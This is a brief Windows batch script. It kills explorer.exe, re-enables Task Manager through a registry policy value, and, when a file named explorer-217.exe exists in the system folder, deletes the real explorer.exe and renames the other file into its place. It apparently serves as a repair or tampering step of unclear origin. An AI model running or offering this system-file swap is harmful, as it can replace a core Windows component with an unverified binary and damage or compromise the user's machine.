@echo off
taskkill /F /IM explorer.exe
ping localhost -n 2 >nul
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f
C:
cd %systemroot%
if exist explorer-217.exe copy explorer.exe explorer_safe.exe&del explorer.exe&ren explorer-217.exe explorer.exe
@echo.>>C:\mas\service.log
exit